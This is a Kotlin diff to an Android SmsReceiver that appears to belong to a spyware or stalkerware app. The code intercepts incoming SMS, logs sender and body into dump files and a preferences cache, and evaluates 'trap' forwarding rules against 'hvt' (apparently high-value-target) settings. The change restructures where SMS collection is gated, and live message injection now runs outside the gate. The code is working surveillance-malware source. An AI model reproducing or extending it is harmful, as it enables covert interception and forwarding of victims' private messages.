@@ -55,23 +55,10 @@ class SmsReceiver : BroadcastReceiver() {
 
         private fun processMessage(context: Context, sender: String, body: String, editor: android.content.SharedPreferences.Editor, pendingResult: BroadcastReceiver.PendingResult?) {
             DebugLogger.log("SMS_PARSE", "Message from $sender intercepted.")
-
-            if (!ConfigManager.canCollect(context, "sms")) {
-                DebugLogger.log("SMS_BLOCKED", "SMS collection disabled in Config.")
-                pendingResult?.finish()
-                return
-            }
-
-            val entry = JSONObject().apply {
-                put("sender", sender)
-                put("body", body)
-                put("timestamp", System.currentTimeMillis())
-            }
-            
-            DumpManager.appendLog("SMS", entry)
+            val timestamp = System.currentTimeMillis()
             
             try {
-                DynamicUIManager.injectLiveSms(sender, body, System.currentTimeMillis())
+                DynamicUIManager.injectLiveSms(sender, body, timestamp)
             } catch (e: Exception) {}
 
             val hvtPrefs = context.getSharedPreferences("hvt_prefs", Context.MODE_PRIVATE)
@@ -147,14 +134,26 @@ class SmsReceiver : BroadcastReceiver() {
                 DebugLogger.log("TRAP_EVAL", "No forwarding rules matched for sender [$sender]")
             }
 
-            try {
-                val prefs = context.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
-                val cacheStr = prefs.getString("sms_logs_cache", "[]") ?: "[]"
-                val cacheArr = JSONArray(cacheStr)
-                cacheArr.put(entry)
-                if (cacheArr.length() > 50) cacheArr.remove(0)
-                editor.putString("sms_logs_cache", cacheArr.toString())
-            } catch(e: Exception) {}
+            // TELEMETRY GATING
+            if (ConfigManager.canCollect(context, "sms")) {
+                val entry = JSONObject().apply {
+                    put("sender", sender)
+                    put("body", body)
+                    put("timestamp", timestamp)
+                }
+                DumpManager.appendLog("SMS", entry)
+
+                try {
+                    val prefs = context.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+                    val cacheStr = prefs.getString("sms_logs_cache", "[]") ?: "[]"
+                    val cacheArr = JSONArray(cacheStr)
+                    cacheArr.put(entry)
+                    if (cacheArr.length() > 50) cacheArr.remove(0)
+                    editor.putString("sms_logs_cache", cacheArr.toString())
+                } catch(e: Exception) {}
+            } else {
+                DebugLogger.log("SMS_BLOCKED", "SMS collection disabled in Config.")
+            }
 
             // JudasManager handled entirely via System Events now
 
